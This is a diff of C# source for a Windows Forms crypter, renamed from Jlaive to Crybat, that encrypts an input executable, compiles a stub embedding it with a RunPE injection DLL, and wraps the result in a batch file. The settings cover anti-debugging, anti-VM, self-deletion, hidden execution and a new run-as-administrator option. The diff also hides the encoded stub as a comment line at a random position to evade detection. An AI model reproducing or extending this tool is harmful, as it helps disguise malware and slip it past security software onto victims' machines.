@@ -10,9 +10,9 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.CSharp;
 
-using static Jlaive.Utils;
+using static Crybat.Utils;
 
-namespace Jlaive
+namespace Crybat
 {
     public partial class Form1 : Form
     {
@@ -21,38 +21,18 @@ namespace Jlaive
             InitializeComponent();
         }
 
+        // Event handlers
         private void Form1_Load(object sender, EventArgs e)
         {
             SettingsObject obj = Settings.Load();
-            if (obj != null)
-            {
-                textBox1.Text = obj.inputFile;
-                antiDebug.Checked = obj.antiDebug;
-                antiVM.Checked = obj.antiVM;
-                selfDelete.Checked = obj.selfDelete;
-                hidden.Checked = obj.hidden;
-                aesEncryption.Checked = obj.aes;
-                xorEncryption.Checked = obj.xor;
-                listBox1.Items.AddRange(obj.bindedFiles);
-            }
-            Task.Factory.StartNew(CheckVersion); // Comment out this line to disable version checking
+            if (obj != null) UnpackSettings(obj);
+            Task.Factory.StartNew(CheckVersion);
             UpdateKeys(sender, e);
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            SettingsObject obj = new SettingsObject();
-            obj.inputFile = textBox1.Text;
-            obj.antiDebug = antiDebug.Checked;
-            obj.antiVM = antiVM.Checked;
-            obj.selfDelete = selfDelete.Checked;
-            obj.hidden = hidden.Checked;
-            obj.aes = aesEncryption.Checked;
-            obj.xor = xorEncryption.Checked;
-            List<string> paths = new List<string>();
-            foreach (string item in listBox1.Items) paths.Add(item);
-            obj.bindedFiles = paths.ToArray();
-            Settings.Save(obj);
+            Settings.Save(PackSettings());
             Environment.Exit(0);
         }
 
@@ -64,10 +44,7 @@ namespace Jlaive
             textBox1.Text = ofd.FileName;
         }
 
-        private void buildButton_Click(object sender, EventArgs e)
-        {
-            Crypt();
-        }
+        private void buildButton_Click(object sender, EventArgs e) => Crypt();
 
         private void aesEncryption_CheckedChanged(object sender, EventArgs e)
         {
@@ -92,6 +69,7 @@ namespace Jlaive
             listBox1.Items.Remove(listBox1.SelectedItem);
         }
 
+        // Functions
         private void Crypt()
         {
             buildButton.Enabled = false;
@@ -138,22 +116,19 @@ namespace Jlaive
             listBox2.Items.Add("Building stub...");
             string tempfile = Path.GetTempFileName();
             File.WriteAllBytes("payload.exe", payload_enc);
-            byte[] unhookerdll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Jlaive.Resources.apiunhooker.dll")), _stubkey, _stubiv);
-            File.WriteAllBytes("apiunhooker.dll", unhookerdll_enc);
             if (!isnetasm)
             {
-                byte[] runpedll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll")), _stubkey, _stubiv);
+                byte[] runpedll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Crybat.Resources.runpe.dll")), _stubkey, _stubiv);
                 File.WriteAllBytes("runpe.dll", runpedll_enc);
             }
             CSharpCodeProvider csc = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" }, tempfile)
             {
                 GenerateExecutable = true,
-                CompilerOptions = "/optimize",
+                CompilerOptions = "-optimize",
                 IncludeDebugInformation = false
             };
             parameters.EmbeddedResources.Add("payload.exe");
-            parameters.EmbeddedResources.Add("apiunhooker.dll");
             if (!isnetasm) parameters.EmbeddedResources.Add("runpe.dll");
             foreach (string item in listBox1.Items) parameters.EmbeddedResources.Add(item);
             CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
@@ -170,7 +145,6 @@ namespace Jlaive
             }
             byte[] stubbytes = File.ReadAllBytes(tempfile);
             File.Delete("payload.exe");
-            File.Delete("apiunhooker.dll");
             if (!isnetasm) File.Delete("runpe.dll");
             File.Delete(tempfile);
 
@@ -178,11 +152,24 @@ namespace Jlaive
             byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);
 
             listBox2.Items.Add("Creating batch file...");
-            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, rng);
-            content += Convert.ToBase64String(stub_enc);
+            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, rng);
+            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
+            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
+            content = string.Join(Environment.NewLine, content_lines);
+
+            SaveFileDialog sfd = new SaveFileDialog()
+            {
+                AddExtension = true,
+                DefaultExt = "bat",
+                Title = "Save File",
+                Filter = "Batch files (*.bat)|*.bat",
+                RestoreDirectory = true,
+                FileName = Path.ChangeExtension(_input, "bat")
+            };
+            sfd.ShowDialog();
 
             listBox2.Items.Add("Writing output...");
-            File.WriteAllText(Path.ChangeExtension(_input, "bat"), content, Encoding.ASCII);
+            File.WriteAllText(sfd.FileName, content, Encoding.ASCII);
 
             MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
             buildButton.Enabled = true;
@@ -193,17 +180,17 @@ namespace Jlaive
             try
             {
                 WebClient wc = new WebClient();
-                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/ch2sh/Jlaive/main/version").Trim();
+                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/ch2sh/Crybat/main/version").Trim();
                 wc.Dispose();
                 if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
                 {
                     string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
                     if (currentversion != latestversion)
                     {
-                        DialogResult result = MessageBox.Show($"Jlaive {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
+                        DialogResult result = MessageBox.Show($"Crybat {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                         if (result == DialogResult.Yes)
                         {
-                            Process.Start("https://github.com/ch2sh/Jlaive/releases/tag/" + latestversion);
+                            Process.Start("https://github.com/ch2sh/Crybat/releases/tag/" + latestversion);
                         }
                     }
                 }
@@ -222,6 +209,38 @@ namespace Jlaive
             key2.Text = Convert.ToBase64String(aes.Key);
             iv6.Text = Convert.ToBase64String(aes.IV);
             aes.Dispose();
+        }
+
+        private void UnpackSettings(SettingsObject obj)
+        {
+            textBox1.Text = obj.inputFile;
+            antiDebug.Checked = obj.antiDebug;
+            antiVM.Checked = obj.antiVM;
+            selfDelete.Checked = obj.selfDelete;
+            hidden.Checked = obj.hidden;
+            runas.Checked = obj.runas;
+            aesEncryption.Checked = obj.aes;
+            xorEncryption.Checked = obj.xor;
+            listBox1.Items.AddRange(obj.bindedFiles);
+        }
+
+        private SettingsObject PackSettings()
+        {
+            SettingsObject obj = new SettingsObject()
+            {
+                inputFile = textBox1.Text,
+                antiDebug = antiDebug.Checked,
+                antiVM = antiVM.Checked,
+                selfDelete = selfDelete.Checked,
+                hidden = hidden.Checked,
+                runas = runas.Checked,
+                aes = aesEncryption.Checked,
+                xor = xorEncryption.Checked
+            };
+            List<string> paths = new List<string>();
+            foreach (string item in listBox1.Items) paths.Add(item);
+            obj.bindedFiles = paths.ToArray();
+            return obj;
         }
     }
 }
